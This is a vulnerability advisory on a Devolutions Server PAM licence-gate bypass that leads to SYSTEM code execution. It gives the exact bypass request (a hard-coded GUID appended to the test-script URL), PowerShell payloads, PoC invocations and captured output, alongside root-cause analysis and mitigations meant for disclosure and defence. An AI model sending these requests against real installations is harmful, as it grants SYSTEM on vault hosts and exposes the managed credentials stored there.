# Devolutions Server (DVLS) 2026.2.14.0 — Bypassable PAM Entitlement Gate Reaches the `test-script` PowerShell Sink: Administrator to `NT AUTHORITY\SYSTEM`

## 1. Overview

Devolutions Server (DVLS) 2026.2.14.0 is a closed-source commercial credential vault / privileged-access-management (PAM) product and remote-session broker from Devolutions (Canada). It is built on .NET 10 and ASP.NET Core, self-hosts Kestrel inside the Windows service `DevolutionsServerKestrel` (running as `LocalSystem`), uses OpenIddict for OAuth/OIDC and SQL Server for state, and installs a companion scheduler service `DevolutionsSchedulerServicedvls`. The decompiled surface audited here comprises 131 controllers and roughly 880 HTTP endpoints, of which 11 carry `[AllowAnonymous]`.

This advisory documents a privilege-boundary defect in the PAM module: the web-administration scope of DVLS is equivalent to arbitrary operating-system code execution as `SYSTEM` on the vault host, and the entitlement gate meant to hold that capability behind a PAM licence is defeated by injecting one fixed, hard-coded GUID into the request query string. A DVLS administrator (`IsAdministrator=true`) reaches the `test-script` PowerShell sink and obtains arbitrary code execution as `NT AUTHORITY\SYSTEM` via WinRM to localhost — on a default installation carrying no PAM licence at all, because Windows Server ships with WinRM enabled and the service account is `LocalSystem`. The research path followed below: attack-surface enumeration → sink localization (every user-controllable PowerShell sink in the product sits inside the licence-gated PAM module) → source identification → entitlement-gate reverse engineering → chain construction → dynamic verification on a Windows lab host → adversarial re-verification by two independent passes. The first phase attempted an unauthenticated result; that negative outcome is reported explicitly in section 4 because it bounds the severity of everything after it.

## 2. Vulnerability Summary

- **Type**: missing / improper authorization on an entitlement gate (CWE-862, CWE-285) exposing an OS command execution sink (CWE-78)
- **Entry point**: `POST /api/pam/provider-templates/test-script` — controller `PamProviderTemplateController`, action `TestCommandScript`, body field `Script`
- **Preconditions**: a DVLS administrator session (`IsAdministrator=true`) and HTTP reachability of the management port (9444 default, configurable). No PAM licence, no special PAM role assignment, no MITM or request hijacking. Default configuration is sufficient.
- **Root cause**: `ProductRequiredAttribute.IsCredentialFromPamSystemVault()` substring-matches `uri.AbsoluteUri` — built from `Request.GetDisplayUrl()`, i.e. the **whole URL including the query string** — against `PamConstants.PamSystemVaultIds`, a `static readonly` list of GUIDs hard-coded in the binary and therefore identical on every installation. Appending one of them (the primary being `PamSystemVaultID = ff7b757a-cdca-4a11-9dc6-d59989647279`) as a query parameter makes the check return true. `PamIsAvailable()` then hits `if (flag && IsCredentialFromPamSystemVault(context, sessionContext)) return true;`, where `flag` is `PamManager.HasInfrastructureVaultAccess(sessionContext)` (administrative permission 3000 or 3001) — and an administrator holds **every** `AdministrativePermission` value automatically, so the gate returns true without any licence validation.
- **Sink**: `scriptInfo.Script` is passed fully user-controlled to `PowershellScriptRunner`; `UseNewWinRm` is hard-coded `true`, so `ExecuteWinRMScript()` runs, and with `CustomCredential=null` the unset `Hostname` falls back to `Environment.MachineName` — WinRM to localhost on port 5985 as the `LocalSystem` service identity.
- **Result**: arbitrary PowerShell execution as `NT AUTHORITY\SYSTEM` on the DVLS host. Baseline `HTTP 403 {"message":"License  is required"}` versus `HTTP 200 [" : nt authority\\system"]` for the same administrator token and the same request body, the only difference being the injected GUID.
- **CVSS**: 9.1 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` (rationale and the conservative 7.2 alternative in section 11)

## 3. Product & Architecture

Vendor Devolutions (Canada); product Devolutions Server (DVLS), a credential vault / PAM / remote-session broker; version verified 2026.2.14.0. Stack: .NET 10, ASP.NET Core, self-hosted Kestrel, OpenIddict OAuth/OIDC, SQL Server. Deployment: Windows services `DevolutionsServerKestrel` (`LocalSystem`) and `DevolutionsSchedulerServicedvls`. Management endpoint: HTTP, port 9444 by default (configurable). Audited surface: 131 controllers, ~880 HTTP endpoints, 11 `[AllowAnonymous]` endpoints (all sink-free). Licence model: PAM features are gated by the `[ProductRequired]` attribute on the PAM controller base class, and licence tokens are verified cryptographically by `DevolutionsLicenseManager.DecodeToken`. Prior public CVE history: roughly 16 NVD entries, all 2021-2023, all authenticated access-control / SQL injection / XSS issues — no remote-code-execution precedent. Shipped default credentials: none — the administrator password is set during installation and all RSA key material is generated at install time. The architecture matters twice over: the service identity is `LocalSystem`, so anything the server process can be induced to execute locally executes as `SYSTEM`; and the PAM module is the only place in the product where a user-supplied script string reaches a PowerShell execution primitive, which is exactly why the entitlement gate on that module is a security boundary rather than merely a commercial one. Decompiled artifacts referenced below: `Devolutions.Server.Controllers.APIControllers.License\ProductRequiredAttribute.cs` (entitlement gate: `PamIsAvailable`, `IsCredentialFromPamSystemVault`); `Devolutions.Server.Common\Devolutions.Server.Pam\PamConstants.cs` (hard-coded fixed GUID list); `Devolutions.Server.Controllers.APIControllers.Pam\PamProviderTemplateController.cs` (the `TestCommandScript` sink); `Devolutions.Pam.Common\PowershellScriptRunner.cs` (`ExecuteWinRMScript`, localhost fallback); `Devolutions.Server.Common\Devolutions.Server.Managers\RoleAssignmentAdministrativePermissionResolver.cs` (administrator receives every permission).

## 4. Authentication & Privilege Boundary

### Authentication Boundary

Authentication is a plaintext-password login: `POST /api/login` with `{"UserName":"admin","LoginParameters":{"Password":"<plaintext>"}}` returns `data.tokenId` (a GUID), which later requests carry in the `tokenId` HTTP header. Requests decorated `[SessionRequired]` reach `TokenManager.IsTokenValid()`, a DB-backed parameterized lookup against `LoginHistory`; an arbitrary GUID with no matching row returns false. Authorization is layered: a global `UseAuthorization()` middleware plus per-method attributes (`[SessionRequired]`, `[AdministrativePermissionRequired(...)]`, `[ProductRequired]`). There is no hard-coded default password — the administrator password is chosen at install time — so the precondition for this finding is a legitimately provisioned administrator account, not shipped credentials.

### Negative result: Target A (unauthenticated RCE) was not achieved

- All 11 `[AllowAnonymous]` endpoints were enumerated and each is sink-free: none reaches a command-execution, deserialization, file-write or SQL sink.
- Authentication is enforced twice — middleware principal check, then the DB-backed `IsTokenValid()` lookup — so token forgery would require a row that already exists in `LoginHistory`.
- Seven distinct bypass paths were constructed and excluded; two independent review passes reached the same conclusion and a separate cross-analysis agreed.

The honest outcome: unauthenticated remote code execution is architecturally unreachable on this version. That line of attack was stopped and the research pivoted to the authenticated scope, so what follows is an authenticated privilege-boundary defect, not an unauthenticated one. Stating this explicitly matters because it bounds the impact of section 5 onward, and because the negative result is itself a finding about the product's design.

### Privilege Boundary

A DVLS administrator is meant to administer the vault through the web console. The PAM module — including the custom-provider-template script-testing feature — is a separately entitled capability, gated by `[ProductRequired]` on `PamBaseApiController`, with licensed installations decoding a signed licence token. Two properties must hold for that design to be a security boundary: web-admin scope must not be equivalent to OS-level execution on the vault host, and an entitlement check protecting a host-execution capability must not depend on a value an attacker can read out of the binary and echo back in a URL. Both fail here; the second fails on a constant. This is a privilege-boundary and licence-gate defect, not a statement about product pricing: the security claim being broken is that a web-administration session must not be convertible into OS-level execution on the vault host by echoing a constant in a URL.

## 5. Root-Cause Analysis

### Attack Surface

Relevant surface for this chain: HTTP on the management port (9444 default); `POST /api/login` for the plaintext-password login returning `data.tokenId`; the `tokenId` request header as session carrier, validated by `[SessionRequired]` → `TokenManager.IsTokenValid()` → DB-backed `LoginHistory` parameterized query; `GET /api/security/licenses` as the licence probe (returns `[]` on an unlicensed install); and the vulnerable endpoint `POST /api/pam/provider-templates/test-script`, gated by the class-level `[ProductRequired]` on `PamBaseApiController` and by `[AdministrativePermissionRequired(PamSettingsCustomProviderTemplatesView=2730, ...Add=2731, ...Edit=2732)]` (OR semantics) plus `[HttpPost]` / `[Route("test-script")]`. The execution channel out of the application is WinRM to localhost on port 5985 (http), running as the `LocalSystem` service identity. `PowershellScriptRunner` — the product's direct PowerShell execution class — was enumerated across the whole code base: every sink accepting a user-controlled script string lives inside the PAM module and is therefore behind `[ProductRequired]`. The strongest of them (fully user-controlled string; no filtering, allow-list or sandbox) is the provider-template script tester.

### Sink Identification

```csharp
// PamProviderTemplateController.cs
[AdministrativePermissionRequired(
    AdministrativePermission.PamSettingsCustomProviderTemplatesView,   // 2730
    AdministrativePermission.PamSettingsCustomProviderTemplatesAdd,    // 2731
    AdministrativePermission.PamSettingsCustomProviderTemplatesEdit)]  // 2732 (OR)
[HttpPost]
[Route("test-script")]
public IHttpActionResult TestCommandScript([FromBody] PowershellScriptInfo scriptInfo)
{
    PowerShellOptions powerShellOptions = new PowerShellOptions();
    powerShellOptions.UseNewWinRm = true;                                 // hard-coded
    powerShellOptions.Hostname = scriptInfo?.CustomCredential?.Hostname;  // null when CustomCredential=null
    // ...
    PowershellScriptRunner runner = new PowershellScriptRunner(scriptInfo.Script, ...);
    PSResult result = runner.Run();
}
```

Three properties make this the sink: `scriptInfo.Script` comes straight from `[FromBody]` and is fully attacker-controlled; `UseNewWinRm = true` is hard-coded, forcing execution down the WinRM path (`ExecuteWinRMScript()`) rather than an in-process path; and with `CustomCredential` null, `Hostname` is null, which triggers the localhost fallback analysed below. The action performs no validation of the script content whatsoever.

### Source Identification

Source = `scriptInfo.Script`, the JSON request body. Sanitization: none observed — no character filtering, no command allow-list, no length limit, no constrained-language mode, no sandbox; the string is passed verbatim to `PowershellScriptRunner`. `CustomCredential` and `Arguments` are attacker-controlled too but are not needed for the chain: setting `CustomCredential` to `null` is precisely what selects the localhost fallback.

```
POST /api/pam/provider-templates/test-script
tokenId: <admin-tokenId>
Content-Type: application/json
{"Script":"<arbitrary PowerShell>","CustomCredential":null,"Arguments":[],"UseNewWinRm":true}
```

### Data Flow

```
HTTP POST /api/pam/provider-templates/test-script?<hard-coded-guid>=1
  Body:   {"Script":"<user-controlled>","CustomCredential":null,"Arguments":[],"UseNewWinRm":true}
  Header: tokenId: <admin-tokenId>
    -> [ProductRequired] on PamBaseApiController -> PamIsAvailable()  <- entitlement gate
    -> [AdministrativePermissionRequired(2730/2731/2732)]             <- administrator passes automatically
    -> TestCommandScript([FromBody] scriptInfo): UseNewWinRm = true (hard-coded), Hostname = null
    -> new PowershellScriptRunner(scriptInfo.Script, ...).Run()
         -> ShouldUseNewWinRM() == true (Windows + UseNewWinRm) -> ExecuteWinRMScript()
              text = options.Hostname ?? ""                            // ""
              if (string.IsNullOrEmpty(text)) text = Environment.MachineName;  // <- localhost fallback
              num = 5985                                               // http WinRM
              powershellConnection = new PowershellConnection(text, 5985, false, null, ...)
              powershellConnection.OpenShell(); powershellConnection.SendCommand(script.Script, ...)  // <- user script executes
    -> WinRM on localhost as LocalSystem -> arbitrary PowerShell as NT AUTHORITY\SYSTEM
```

### The entitlement gate as written

```csharp
// ProductRequiredAttribute.cs
private bool PamIsAvailable(ActionExecutingContext context)
{
    ISessionContext sessionContext = context.HttpContext.GetSessionContext();
    bool flag = PamManager.HasInfrastructureVaultAccess(sessionContext);   // perm 3000 OR 3001
    if (IsAllowedMethodWithoutPamLicense(context))                          // [AllowWithoutPamLicense]
    {
        if (IsCredentialFromPamSystemVault(context, sessionContext)) return flag;
        return true;
    }
    if (flag && IsCredentialFromPamSystemVault(context, sessionContext)) return true;  // <- bypass branch
    // UserType==9 -> HasValidPamLicense(); else -> HasLicense(sessionContext)  <- licence required
}
```

Supporting facts from the decompiled code: `HasInfrastructureVaultAccess` is `AdministrativePermissionResolver.HasPermission(3000) || HasPermission(3001)`; `RoleAssignmentAdministrativePermissionResolver.LoadGlobalPermissions` grants an administrator every value of the `AdministrativePermission` enumeration (`if (context.IsAdministrator) { foreach all enum values -> IsAdmin }`), so `flag == true` for any administrator and the 2730/2731/2732 method attribute is satisfied as well; `test-script` is **not** annotated `[AllowWithoutPamLicense]`, so the first branch is not the one taken; and the licence branch (`HasLicense` / `HasValidPamLicense`) ultimately calls `DevolutionsLicenseManager.DecodeToken`, which performs cryptographic signature verification. That path is not forgeable — the defect is not in licence verification at all, it is in the early return above it.

### The defect: entitlement decided by substring match over the full URL

```csharp
// ProductRequiredAttribute.cs
private static bool IsCredentialFromPamSystemVault(ActionExecutingContext context, ISessionContext sessionContext)
{
    Uri uri = new Uri(context.HttpContext.Request.GetDisplayUrl());   // <- includes the query string
    if (PamConstants.PamSystemVaultIds.Any((Guid pamSystemVaultId) =>
            uri.AbsoluteUri.Contains(pamSystemVaultId.ToString(), StringComparison.OrdinalIgnoreCase)))
        return true;
    // ... second branch: checkout ID match ...
    return ...;
}
```

Four facts combine. (1) `GetDisplayUrl()` (`Microsoft.AspNetCore.Http.Extensions.UriHelper.GetDisplayUrl()`) returns the complete URL **including the query string**. (2) `uri.AbsoluteUri` likewise includes the query string. (3) `uri.AbsoluteUri.Contains(...)` therefore substring-matches over attacker-controlled text — the attacker chooses where in the URL the match occurs. (4) `PamConstants.PamSystemVaultIds` is a `static readonly` list of eight GUIDs — compile-time constants, identical across every installation, recoverable from the shipped binaries; the one used here is declared in `PamConstants.cs` as `public static readonly Guid PamSystemVaultID = new Guid("ff7b757a-cdca-4a11-9dc6-d59989647279")`, and the list also covers the system SQL account identifiers, system provider identifier, and system propagation template/script identifiers. Because the match is position-agnostic, the constant need not be a route parameter, a body field, or anything semantically connected to the resource being accessed — placing it in the query string suffices. The question the gate asks ("is this request operating on a PAM system-vault credential?") is answered by "does this URL happen to contain a constant string?", so a fixed constant is used as the credential for a security decision while being neither secret nor per-installation.

### The localhost WinRM pivot

The final step converts "run PowerShell" into "run PowerShell as SYSTEM on the vault host". In `PowershellScriptRunner.ExecuteWinRMScript()`, when `Hostname` is unset the target defaults to `Environment.MachineName` — the local machine — with WinRM port 5985 (http) and a null custom credential, so the connection is established as the service account. DVLS runs as `LocalSystem`, hence `NT AUTHORITY\SYSTEM`. A sink designed to test a script against a *remote managed host* silently re-targets itself to the *vault server itself*, at the highest local privilege, whenever that optional field is omitted.

## 6. Exploit Chain Construction

**Step 0 — authenticate as administrator, then establish the negative control.** `POST /api/login` with the install-time administrator password; take `data.tokenId` from the response and send it as the `tokenId` header on every later request. `GET /api/security/licenses` returns `[]` on the unlicensed installation, confirming the PAM module is not entitled.

**Step 1 — baseline request, gate engaged.** `POST /api/pam/provider-templates/test-script` with body `{"Script":"whoami","CustomCredential":null,"Arguments":[],"UseNewWinRm":true}` → `HTTP/1.1 403` and `{"message":"License  is required"}`. **Step 2 — bypass request: same token, same body, GUID in the query string.** The parameter name and value after `?` are irrelevant; only the presence of the constant substring matters.

```
POST /api/pam/provider-templates/test-script?ff7b757a-cdca-4a11-9dc6-d59989647279=1 HTTP/1.1
tokenId: <admin-tokenId>
Content-Type: application/json
{"Script":"whoami","CustomCredential":null,"Arguments":[],"UseNewWinRm":true}

HTTP/1.1 200
[" : nt authority\\system"]
```

The gate evaluates `uri.AbsoluteUri` = `http://127.0.0.1:9444/api/pam/provider-templates/test-script?ff7b757a-cdca-4a11-9dc6-d59989647279=1`; `Contains("ff7b757a-cdca-4a11-9dc6-d59989647279")` is true; `flag` is true because the caller is `IsAdministrator`; the early return fires and `PamIsAvailable()` returns true, so `TestCommandScript` executes the supplied script over WinRM to localhost as SYSTEM.

**Step 3 — confirm the integrity level and demonstrate arbitrary code execution.** Send `whoami /groups` and expect `S-1-5-18` plus `Mandatory Label\System Mandatory Level S-1-16-16384`; then send a script that writes and reads back a marker file under a SYSTEM-protected directory (section 8).

## 7. PoC Usage

A single-file, standard-library-only Python 3 PoC ships with this advisory (`exploit/dvls_pam_gate_testscript_system_rce.py`). It performs login, the licence probe, the baseline request (expect 403), the bypass request (expect 200 plus command output), and prints the chain summary. No third-party dependencies (no `requests`).

```bash
python3 exploit/dvls_pam_gate_testscript_system_rce.py --host 127.0.0.1 --port 9444 \
  --user admin --password '<password>' --command 'whoami'
python3 exploit/dvls_pam_gate_testscript_system_rce.py --host 127.0.0.1 --port 9444 \
  --user admin --password '<password>' \
  --command "New-Item -Path C:\Windows\Temp\poc_marker.txt -Value PWNED-BY-POC-SYSTEM; Get-Content 'C:\Windows\Temp\poc_marker.txt'"
```

Defaults: `--host 127.0.0.1`, `--port 9444`, `--user admin`, `--command whoami`; `--password` has no default and must be supplied, since the product ships no credential. Supplying `--command 'whoami /groups'` confirms the integrity level rather than only the account name. Expected output: baseline `HTTP 403 {"message":"License  is required"}` followed by bypass `HTTP 200 [" : nt authority\\system"]`. For authorized security testing and coordinated disclosure only, against installations you own or are explicitly permitted to test.

## 8. Verification Evidence

**Environment.** Windows Server 2025 lab host; full DVLS 2026.2.14.0 installation; SQL Server Express back end; Kestrel self-hosted service `DevolutionsServerKestrel` running as `LocalSystem`; management endpoint HTTP `127.0.0.1:9444` (HTTP, not HTTPS); WinRM enabled by default on 5985/http. Licence state: **no PAM licence** — `GET /api/security/licenses` returned `[]`, and the database row `AppSettings.LicenseStateDayCounters={"DaysInFree":1,"DaysInPaid":0,"DaysInTrial":0}` confirms the free tier. The PoC ran under Python 3.12.10 on the host, standard library only.

**8.1 Baseline versus bypass — identical token, identical body, one difference.** Condensed PoC stdout:

```
[+] login successful, tokenId=<tokenId>
[*] licence state: HTTP 200, []
[*] baseline (no GUID): HTTP 403    {"message":"License  is required"}
[*] request: POST http://127.0.0.1:9444/api/pam/provider-templates/test-script?ff7b757a-cdca-4a11-9dc6-d59989647279=1
[*] response: HTTP 200
[*] body:
    [" : nt authority\\system"]
[+] exploit succeeded, command executed as NT AUTHORITY\SYSTEM
```

**8.2 `whoami /groups` — SYSTEM integrity level, not a reduced token.** HTTP 200 body below; `NT AUTHORITY\SYSTEM (S-1-5-18)` together with `Mandatory Label\System Mandatory Level (S-1-16-16384)` proves execution at the System integrity level with no downgrade.

```
[" : NT AUTHORITY\\SYSTEM  ...  S-1-5-18",
 " : BUILTIN\\Administrators  ...  S-1-5-32-544",
 " : Everyone  ...  S-1-1-0",
 " : NT AUTHORITY\\Authenticated Users  ...  S-1-5-11",
 " : Mandatory Label\\System Mandatory Level  S-1-16-16384"]
```

**8.3 Marker file — arbitrary code execution in the SYSTEM profile.** Command sent through the sink: `New-Item -Path C:\Windows\Temp\poc_marker.txt -Value PWNED-BY-POC-SYSTEM; Get-Content 'C:\Windows\Temp\poc_marker.txt'`. Response body (HTTP 200) below; `Home : C:\Windows\system32\config\systemprofile` is the SYSTEM account profile path, showing the WinRM session ran in SYSTEM context rather than the caller's context.

```
[" :     Directory: C:\\Windows\\Temp",
 " : Mode  LastWriteTime  Length Name",
 " : ----  -------------  ------ ----",
 " : -a---  <write time>     21 poc_marker.txt",
 " : PWNED-BY-POC-SYSTEM",
 " :     Home : C:\\Windows\\system32\\config\\systemprofile"]
```

**8.4 Independent host-side readback (not through the vulnerable HTTP path).** The marker was re-read over an independent SSH session to the lab host, ruling out a forged or echoed HTTP response. Writing into `C:\Windows\Temp\` requires SYSTEM/administrator rights, the file owner is `NT AUTHORITY\SYSTEM` (so the creating process ran as SYSTEM), and the file creation time matched the PoC run.

```powershell
PS> Test-Path C:\Windows\Temp\poc_marker.txt
True
PS> Get-Content C:\Windows\Temp\poc_marker.txt
PWNED-BY-POC-SYSTEM
PS> (Get-Acl C:\Windows\Temp\poc_marker.txt).Owner
NT AUTHORITY\SYSTEM
```

**8.5 Adversarial re-verification.** As an authenticated-RCE class result, this was forced through two independent passes before acceptance. *Falsification pass*: six dimensions were attacked — is the GUID fixed across installations, is the bypass branch reachable for this action, does `GetDisplayUrl()` include the query string, are administrative permissions automatic for `IsAdministrator`, could the result be a test-environment artifact, is the sink genuinely user-controllable. All six CONFIRMED, none falsifiable. Two further facts emerged: an administrator automatically holds every `AdministrativePermission`, so **any** administrator can use this without a special PAM role assignment; and the licence counters (`DaysInPaid: 0`, `DaysInTrial: 0`) prove the lab genuinely had no PAM entitlement, so the 200 response was not an artifact of a licensed environment. *Independent re-analysis pass*: the seven links of the chain were re-derived from scratch and the exploit re-run dynamically with a unique timestamp-derived marker string that appeared in the HTTP 200 response body, which excludes response caching or replay of an earlier run. Conclusion: CONFIRMED.

## 9. Reachability & Security Impact

**Reachability.** Default configuration suffices: an unlicensed install, the stock administrator account, OS-default WinRM. The licence is not a control an attacker must defeat cryptographically — the gate is answered by a constant present in the shipped binary. Only HTTP reachability of the management port is needed: no second vulnerability, no MITM, no session hijack.

**Blast radius — a PAM product, so the host is the crown jewels.** Execution identity is `NT AUTHORITY\SYSTEM` (S-1-5-18) on the vault host: any file, any registry key, any local process, service installation, host credential-store access (LSA secrets, SAM), security-product tampering and persistence. SYSTEM on the DVLS host also means access to the application's configuration, its connection to the SQL Server back end, and the on-disk and cryptographic material the vault relies on — the boundary protecting stored credentials *is* the host OS, and the host OS now belongs to the attacker. Because a PAM vault holds privileged credentials for the infrastructure it manages (servers, network devices, databases, service accounts) and the product's session-broker role gives it trusted network reach toward exactly those systems, host compromise converts a single web-admin account into a pivot across the managed estate: the practical ceiling is the credential set the vault administers, not the DVLS application.

**Privilege boundary crossed.** The intended scope is "web administrator of a PAM application"; the achieved scope is "operating-system SYSTEM on the vault server". Those are different trust domains — the reason the impact is scored with `S:C` (section 11).

**Who is affected, and how visible it is.** Any DVLS administrator: a low-trust administrator account created for day-to-day vault management, a shared operations login, or an account recovered by credential stuffing against the management port. No special PAM role is required. Installations *without* a PAM licence are affected too, which contradicts the natural assumption that unlicensed modules are inert attack surface. The bypass request differs from a legitimate script test only by a meaningless extra query parameter, and execution happens inside a WinRM session on localhost — outside the application's own audit view of what the script did on the host.

## 10. Mitigation & Fix Recommendations

1. **Stop deciding entitlement from the full URL.** `IsCredentialFromPamSystemVault` must reason about the *resource being operated on*, not a substring of the request URL: match against the path only (`context.HttpContext.Request.Path.Value`), or better, resolve the vault/checkout identifier from a route-bound parameter (`{vaultId:guid}`) or from the body object the action actually consumes, so the identifier cannot be supplied by a bystander query parameter.
2. **Never use a fixed constant as an authorization input.** The `PamSystemVaultIds` GUIDs are recoverable from the shipped binaries and identical on every installation; they carry no per-deployment secrecy and cannot serve as evidence that a credential belongs to the system vault. Replace the constant comparison with a data-store lookup (does this credential/session actually belong to the system vault?).
3. **Decouple host-execution capability from the licence gate.** A user-controlled PowerShell sink must not be protected *only* by an entitlement check — entitlement answers "may this feature be used", not "may this run arbitrary code on my server". Even on a fully licensed installation, `test-script` should run under a restricted identity, in a sandbox or constrained-language mode, with an explicit target host and explicit credentials required, and with script content logged and audited.
4. **Remove the silent `Environment.MachineName` fallback.** Defaulting to localhost at the service's own privilege is the step that turns "test a script against a managed host" into "run arbitrary code as SYSTEM on the vault host". Require an explicit target host, refuse local execution unless the operator deliberately selects it, and run such executions under a least-privilege account rather than `LocalSystem`.

Operator-side hardening until a fix ships: restrict network access to the DVLS management port to a dedicated administration network and hosts; treat every DVLS administrator account as holding SYSTEM on the vault host, because that equivalence is the actual risk; audit administrator accounts and remove or downgrade accounts that do not need vault administration; enable Windows auditing of WinRM session creation and PowerShell script-block logging on the vault host so localhost WinRM sessions spawned by the DVLS process are visible; and run the vault on a dedicated, isolated host or VM so that host compromise does not co-locate with other privileged infrastructure.

## 11. CWE & CVSS rationale

**CWE-862 Missing Authorization** — the request that reaches the sink is never authorized against a real entitlement; the security decision is short-circuited by the early return. **CWE-285 Improper Authorization** — the entitlement gate exists but is implemented incorrectly: it authorizes by substring-matching an attacker-influenced URL against a hard-coded constant. **CWE-78 OS Command Injection** — the user-controlled `Script` value reaches a PowerShell execution primitive over WinRM with no filtering, allow-listing or sandboxing. **CVSS 3.1 — 9.1 Critical**, assigned by us at advisory time (the underlying research record carries no score): `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`. `AV:N` — the chain is driven entirely over HTTP against the management port. `AC:L` — no special conditions: a deterministic single-parameter injection plus one POST, working on default configuration. `PR:H` — a DVLS **administrator** account is genuinely required, and the product ships no default credential (the administrator password is set at install time), so this is not "the default account with the default password"; we deliberately did not score `PR:L`, as no lower-privileged path was found and scoring lower would overstate the result. `UI:N` — no user interaction. `S:C` — the impact crosses a security scope: the vulnerable component is the DVLS PAM web application and its entitlement gate, while the impacted component is the host operating system, where the attacker gains `SYSTEM`, full control of the vault's storage and cryptographic material, and trusted reach into every managed system the vault administers. `C:H / I:H / A:H` — SYSTEM on the vault host yields total read, total write and total denial across the host and, through the vault's contents, across the managed credentials.

**Conservative alternative reading, stated for the reviewer.** If one judges that a PAM administrator who already owns the vault's contents cannot materially exceed their authorized scope, the scope is unchanged (`S:U`) and the same vector scores **7.2** (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`). We chose `S:C` because OS-level SYSTEM execution on the vault host, the host's own credential stores, and the pivot into the managed estate are capabilities outside the PAM application's authority boundary — but the 7.2 reading is defensible, so we document it rather than hide it. *Published at https://0day-rubbish.com/blog/devolutions-server-pam-license-bypass-system-rce as part of batch-11; disclosure state tracked in DISCLOSURE-STATUS.md.*
